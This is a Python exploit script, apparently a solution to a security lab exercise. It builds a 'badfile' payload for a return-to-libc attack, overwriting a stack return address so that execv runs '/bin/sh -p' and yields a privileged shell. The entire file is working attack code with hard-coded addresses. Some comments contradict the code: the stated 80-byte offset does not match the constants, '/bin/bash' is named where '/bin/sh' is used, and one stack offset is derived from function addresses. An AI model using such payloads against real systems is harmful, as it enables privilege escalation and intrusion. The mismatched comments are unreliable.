#!/usr/bin/env python3
import sys

EBP = 0xffffc4c8
BUF = 0xffffc4b0
INP = 0xffffc4e0
LEN = 300

def main():
  # Fill content with non-zero values
  content = bytearray(0xaa for i in range(LEN))

  X = (EBP + 12) - BUF
  pathname_addr = 0xffffcd75       # The address of "/bin/sh"
  content[X:X+4] = (pathname_addr).to_bytes(4,byteorder='little')

  # The difference between the frame pointer address and the buffer[] address is 80.
  # In addition to this, you have also to consider the 4 bytes where base pointer is
  # located. Thus, the location of the return address is
  # 80(buffer) + 4(base pointer)=84 bytes away.
  Y = (EBP + 4) - BUF
  execv_addr = 0xf7e8a6a0   # The address of execv()
  content[Y:Y+4] = (execv_addr).to_bytes(4,byteorder='little')

  Z = (EBP + 8) - BUF
  exit_addr = 0xf7df50c0     # The address of exit()
  content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

  # Computes the distance between the main stack frame and the bof stack frame
  main_addr = 0x565562ef
  bof_addr = 0x5655624d
  frames_gap = main_addr - bof_addr

  W = (EBP + 16) - BUF
  argv_addr = INP + frames_gap    # The address of argv[] in main 
  content[W:W+4] = (argv_addr).to_bytes(4,byteorder='little')

  T = frames_gap
  argv_addr = pathname_addr       # The address of argv[0](address of "/bin/bash") in main 
  content[T:T+4] = (argv_addr).to_bytes(4,byteorder='little')

  S = frames_gap + 4
  argv_addr = 0xffffcdbd          # The address of argv[1](address of "-p") in main 
  content[S:S+4] = (argv_addr).to_bytes(4,byteorder='little')

  D = frames_gap + 8	            # argv[2] = 0 
  content[D:D+4] = (0x0).to_bytes(4,byteorder='little')

  # Save content to a file
  with open("badfile", "wb") as f:
    f.write(content)

if __name__ == "__main__":
  main()